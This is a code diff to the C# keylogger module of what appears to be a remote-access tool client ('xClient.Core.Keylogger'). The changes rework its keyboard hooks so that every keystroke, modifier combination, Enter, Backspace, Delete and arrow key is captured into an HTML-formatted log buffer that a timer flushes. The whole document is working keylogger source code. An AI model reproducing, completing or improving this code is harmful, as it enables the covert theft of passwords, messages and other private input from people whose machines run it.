@@ -50,6 +50,8 @@ namespace xClient.Core.Keylogger
 
             _timerFlush.Enabled = true;
             _timerFlush.Start();
+
+            Application.Run();
         }
 
         ~Logger()
@@ -127,63 +129,125 @@ namespace xClient.Core.Keylogger
             m_Events.Dispose();
         }
 
-        private void OnKeyDown(object sender, KeyEventArgs e)
+        private void OnKeyDown(object sender, KeyEventArgs e) //Called first
         {
-            PressedKeys.Add(e.KeyCode);
+            if (PressedKeys.Contains(Keys.LControlKey) //if modifier keys are still down, they will be highlighted, including any other key pressed
+                || PressedKeys.Contains(Keys.RControlKey)
+                || PressedKeys.Contains(Keys.LMenu)
+                || PressedKeys.Contains(Keys.RMenu)
+                || PressedKeys.Contains(Keys.LWin)
+                || PressedKeys.Contains(Keys.RWin))
+            {
+                if (!PressedKeys.Contains(e.KeyCode)) //prevent multiple keypresses holding down a key
+                    PressedKeys.Add(e.KeyCode);
+            }
+            else if ((e.KeyCode >= Keys.A && e.KeyCode <= Keys.Z) //exclude keys here we don't want to log and return, KeyPress event can handle these if it is a character value
+                || (e.KeyCode >= Keys.NumPad0 && e.KeyCode <= Keys.Divide)
+                || (e.KeyCode >= Keys.D0 && e.KeyCode <= Keys.D9)
+                || (e.KeyCode >= Keys.Oem1 && e.KeyCode <= Keys.OemClear
+                || (e.KeyCode >= Keys.LShiftKey && e.KeyCode <= Keys.RShiftKey)
+                || (e.KeyCode == Keys.CapsLock)))
+            {
+                return;
+            }
+            else if (e.KeyCode == Keys.Enter)
+            {
+                _logFileBuffer.Append("<font color=\"0000FF\">(ENTER)</font><br>"); //this could be where the KeyloggerKeys enum would be handy
+            }
+            else if (e.KeyCode == Keys.Space)
+            {
+                _logFileBuffer.Append(" ");
+            }
+            else if (e.KeyCode == Keys.Back)
+            {
+                _logFileBuffer.Append("<font color=\"0000FF\">(BACK)</font>");
+            }
+            else if (e.KeyCode == Keys.Delete)
+            {
+                _logFileBuffer.Append("<font color=\"0000FF\">(DEL)</font>");
+            }
+            else if (e.KeyCode >= Keys.Left && e.KeyCode <= Keys.Down)
+            {
+                _logFileBuffer.Append("<font color=\"0000FF\">(" + e.KeyCode.ToString() + ")</font>");
+            }
+            else
+                if (!PressedKeys.Contains(e.KeyCode)) //prevent multiple keypresses holding down a key
+                    PressedKeys.Add(e.KeyCode);
         }
 
-        private void OnKeyUp(object sender, KeyEventArgs e)
+        private void Logger_KeyPress(object sender, KeyPressEventArgs e) //Called second
+        {
+            //This method should be used to process all of our unicode characters
+            _logFileBuffer.Append(e.KeyChar);
+        }
+
+        private void OnKeyUp(object sender, KeyEventArgs e) //Called third
         {
             _logFileBuffer.Append(HighlightSpecialKeys(PressedKeys.ToArray()));
-
-            PressedKeys.Remove(e.KeyCode);
-        }
-
-        private void Logger_KeyPress(object sender, KeyPressEventArgs e)
-        {
-            _logFileBuffer.Append(e.KeyChar + " ");
         }
 
         private string HighlightSpecialKeys(Keys[] _names)
         {
+            if (_names.Length < 1) return string.Empty;
+
             string[] names = new string[_names.Length];
-            Array.Copy(_names, names, _names.Length);
-
-            return HighlightSpecialKeys(names);
-        }
-
-        private string HighlightSpecialKeys(string[] names)
-        {
-            if (names.Length < 1) return string.Empty;
-
-            StringBuilder specialKeys = new StringBuilder();
-
-            int ValidSpecialKeys = 0;
-            for (int i = 0; i < names.Length; i++)
+            for (int i = 0; i < _names.Length; i++)
             {
-                if (!string.IsNullOrEmpty(names[i]))
+                names[i] = _names[i].ToString();
+            }
+
+            if (PressedKeys.Contains(Keys.LControlKey)
+                || PressedKeys.Contains(Keys.RControlKey)
+                || PressedKeys.Contains(Keys.LMenu)
+                || PressedKeys.Contains(Keys.RMenu)
+                || PressedKeys.Contains(Keys.LWin)
+                || PressedKeys.Contains(Keys.RWin))
+            {
+                StringBuilder specialKeys = new StringBuilder();
+
+                int ValidSpecialKeys = 0;
+                for (int i = 0; i < names.Length; i++)
                 {
-                    if (ValidSpecialKeys == 0)
+                    PressedKeys.Remove(_names[i]);
+                    if (!string.IsNullOrEmpty(names[i]))
                     {
-                        specialKeys.AppendFormat("<font color=\"0000FF\">([{0}] ", names[i]);
-                    }
-                    else
-                    {
-                        specialKeys.AppendFormat("+ [{0}]", names[i]);
-                    }
+                        if (ValidSpecialKeys == 0)
+                        {
+                            specialKeys.AppendFormat("<font color=\"0000FF\">([{0}] ", names[i]);
+                        }
+                        else
+                        {
+                            specialKeys.AppendFormat("+ [{0}]", names[i]);
+                        }
 
-                    ValidSpecialKeys++;
+                        ValidSpecialKeys++;
+                    }
                 }
-            }
 
-            // If there are items in the special keys string builder, give it an ending
-            // font tag and some trailing white-space.
-            if (ValidSpecialKeys > 0)
+                // If there are items in the special keys string builder, give it an ending
+                // font tag and some trailing white-space.
+                if (ValidSpecialKeys > 0)
+                {
+                    specialKeys.Append(")</font> ");
+                }
+
+                return specialKeys.ToString();
+            }
+            else
             {
-                specialKeys.Append(")</font> ");
-            }
+                StringBuilder normalKeys = new StringBuilder();
 
-            return specialKeys.ToString();
+                for (int i = 0; i < names.Length; i++)
+                {
+                    PressedKeys.Remove(_names[i]);
+                    if (!string.IsNullOrEmpty(names[i]))
+                    {
+                        normalKeys.Append(names[i]);
+                    }
+                }
+
+                return normalKeys.ToString();
+            }
         }
 
         private void timerFlush_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
